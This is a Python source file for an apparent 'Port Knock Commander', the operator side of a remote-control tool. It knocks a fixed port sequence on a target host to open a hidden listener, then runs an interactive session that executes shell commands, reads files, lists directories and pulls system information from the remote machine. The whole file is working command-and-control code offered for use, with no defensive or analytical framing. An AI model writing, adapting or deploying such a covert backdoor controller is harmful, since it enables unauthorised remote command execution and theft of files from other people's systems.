#!/usr/bin/env python3
"""
Commander Program - Sends JSON-formatted commands to client
"""

import socket
import time
import sys
import json


class Commander:
    def __init__(self, target_host, knock_sequence, command_port):
        self.target_host = target_host
        self.knock_sequence = knock_sequence
        self.command_port = command_port
        self.connected = False
        self.sock = None
        self.buffer = b''

    def perform_knock_sequence(self):
        """Perform the port knocking sequence"""
        print("\n[*] Initiating port knock sequence...")
        print(f"[*] Target: {self.target_host}")
        print(f"[*] Sequence: {self.knock_sequence}")
        print()

        for port in self.knock_sequence:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                print(f"[+] Knocking on port {port}...", end=" ")
                sock.connect((self.target_host, port))
                sock.close()
                print("✓")
                time.sleep(0.5)
            except Exception as e:
                print(f"✗ ({e})")

        print("\n[+] Knock sequence complete!")
        time.sleep(1)

    def connect(self):
        """Connect to the command port after knocking"""
        print(f"\n[*] Connecting to command port {self.command_port}...")

        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.target_host, self.command_port))
            self.connected = True

            # Receive welcome message
            response = self.receive_response()
            if response:
                print(f"[+] {response.get('message', 'Connected')}")

            return True

        except Exception as e:
            print(f"[!] Failed to connect: {e}")
            self.connected = False
            return False

    def receive_response(self):
        """Receive and parse a JSON response"""
        try:
            # Read until we get a complete JSON line
            while b'\n' not in self.buffer:
                chunk = self.sock.recv(4096)
                if not chunk:
                    return None
                self.buffer += chunk

            # Extract one complete message
            line, self.buffer = self.buffer.split(b'\n', 1)

            if line.strip():
                return json.loads(line.decode('utf-8'))

        except Exception as e:
            print(f"[!] Error receiving response: {e}")
            return None

    def send_command(self, command_type, params=None):
        """Send a JSON-formatted command"""
        if not self.connected:
            print("[!] Not connected to client")
            return None

        try:
            # Build command
            command = {
                'type': command_type,
                'params': params or {}
            }

            # Send as JSON with newline delimiter
            message = json.dumps(command) + '\n'
            self.sock.send(message.encode('utf-8'))

            # Receive response
            response = self.receive_response()
            return response

        except Exception as e:
            print(f"[!] Error sending command: {e}")
            self.connected = False
            return None

    def execute_shell(self, command):
        """Execute a shell command on the client"""
        response = self.send_command('shell', {'command': command})

        if response and response.get('type') == 'response':
            result = response.get('result', {})
            if result.get('success'):
                print("\n--- OUTPUT ---")
                if result.get('stdout'):
                    print(result['stdout'], end='')
                if result.get('stderr'):
                    print("--- STDERR ---")
                    print(result['stderr'], end='')
                print(f"--- Return code: {result.get('returncode', 'N/A')} ---")
            else:
                print(f"[!] Error: {result.get('error', 'Unknown error')}")

    def read_file(self, filepath):
        """Read a file from the client"""
        response = self.send_command('read_file', {'path': filepath})

        if response and response.get('type') == 'response':
            result = response.get('result', {})
            if result.get('success'):
                print(f"\n--- FILE: {filepath} ({result.get('size')} bytes) ---")
                print(result.get('content', ''))
                print("--- END OF FILE ---")
            else:
                print(f"[!] Error: {result.get('error', 'Unknown error')}")

    def list_directory(self, path='.'):
        """List directory contents"""
        response = self.send_command('list_dir', {'path': path})

        if response and response.get('type') == 'response':
            result = response.get('result', {})
            if result.get('success'):
                print(f"\n--- DIRECTORY: {path} ---")
                for entry in result.get('entries', []):
                    entry_type = '[DIR]' if entry['is_directory'] else '[FILE]'
                    size = f"({entry['size']} bytes)" if not entry['is_directory'] else ''
                    print(f"{entry_type:8} {entry['name']:40} {size}")
                print(f"--- Total: {result.get('count', 0)} entries ---")
            else:
                print(f"[!] Error: {result.get('error', 'Unknown error')}")

    def get_sysinfo(self):
        """Get system information"""
        response = self.send_command('sysinfo')

        if response and response.get('type') == 'response':
            result = response.get('result', {})
            if result.get('success'):
                info = result.get('info', {})
                print("\n--- SYSTEM INFORMATION ---")
                for key, value in info.items():
                    print(f"{key:20}: {value}")
                print("--- END ---")
            else:
                print(f"[!] Error: {result.get('error', 'Unknown error')}")

    def ping(self):
        """Send a ping to test connection"""
        response = self.send_command('ping')

        if response and response.get('type') == 'response':
            result = response.get('result', {})
            if result.get('success'):
                print(f"[+] {result.get('message', 'Pong received')}")
            else:
                print(f"[!] Ping failed")

    def disconnect(self):
        """Disconnect from the client"""
        if self.connected:
            try:
                self.send_command('disconnect')
                time.sleep(0.5)
            except:
                pass

        if self.sock:
            try:
                self.sock.close()
            except:
                pass

        self.connected = False
        print("[*] Disconnected")

    def interactive_session(self):
        """Run an interactive command session"""
        print("\n" + "=" * 60)
        print("Interactive Command Session")
        print("=" * 60)
        print("Available commands:")
        print("  shell <command>    - Execute a shell command")
        print("  read <filepath>    - Read a file")
        print("  ls [path]          - List directory (default: current)")
        print("  sysinfo            - Get system information")
        print("  ping               - Test connection")
        print("  disconnect         - Disconnect and exit")
        print("=" * 60)
        print()

        while self.connected:
            try:
                user_input = input("cmd> ").strip()

                if not user_input:
                    continue

                # Parse command
                parts = user_input.split(maxsplit=1)
                cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ''

                if cmd in ['exit', 'quit', 'disconnect']:
                    self.disconnect()
                    break

                elif cmd == 'shell':
                    if args:
                        self.execute_shell(args)
                    else:
                        print("[!] Usage: shell <command>")

                elif cmd == 'read':
                    if args:
                        self.read_file(args)
                    else:
                        print("[!] Usage: read <filepath>")

                elif cmd == 'ls':
                    path = args if args else '.'
                    self.list_directory(path)

                elif cmd == 'sysinfo':
                    self.get_sysinfo()

                elif cmd == 'ping':
                    self.ping()

                else:
                    print(f"[!] Unknown command: {cmd}")
                    print("[!] Type 'disconnect' for command list")

            except KeyboardInterrupt:
                print("\n[*] Interrupted by user")
                break
            except Exception as e:
                print(f"[!] Error: {e}")

        if self.connected:
            self.disconnect()


def main():
    if len(sys.argv) > 1:
        target_host = sys.argv[1]
    else:
        target_host = 'localhost'

    knock_sequence = [7000, 8000, 9000]
    command_port = 9999

    print("=" * 60)
    print("Port Knock Commander with Command Execution")
    print("=" * 60)

    commander = Commander(target_host, knock_sequence, command_port)

    try:
        commander.perform_knock_sequence()

        if commander.connect():
            commander.interactive_session()
        else:
            print("[!] Failed to establish command connection")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        commander.disconnect()


if __name__ == "__main__":
    main()